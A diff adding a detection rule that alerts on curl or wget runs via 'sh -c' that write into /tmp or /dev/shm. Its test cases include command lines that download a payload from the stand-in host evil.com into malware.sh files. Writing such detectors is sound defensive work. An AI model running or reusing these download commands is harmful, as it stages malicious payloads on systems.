@@ -1,0 +1,20 @@
+name: sigma_curl_wget_exec_tmp
+mode: alert
+overlap_allowed_with: [sigma_susp_shell_script_exec_from_susp_location]
+eval: |
+  (
+    ((e.process_args.contains("/curl") || e.process_args.contains("/wget"))) && ((e.process_args.contains("/tmp/") || e.process_args.contains("/dev/shm/"))) && (e.process_args.contains("sh -c"))
+  )
+tests:
+  - cleartext: "curl to tmp with sh -c"
+    process_name: bash
+    process_args: "sh -c '/usr/bin/curl http://evil.com/payload -o /tmp/malware.sh'"
+    should_match: true
+  - cleartext: "wget to dev shm with sh -c"
+    process_name: sh
+    process_args: "sh -c '/usr/bin/wget http://evil.com/payload -O /dev/shm/malware.sh'"
+    should_match: true
+  - cleartext: "normal curl"
+    process_name: curl
+    process_args: "curl https://example.com"
+    should_match: false
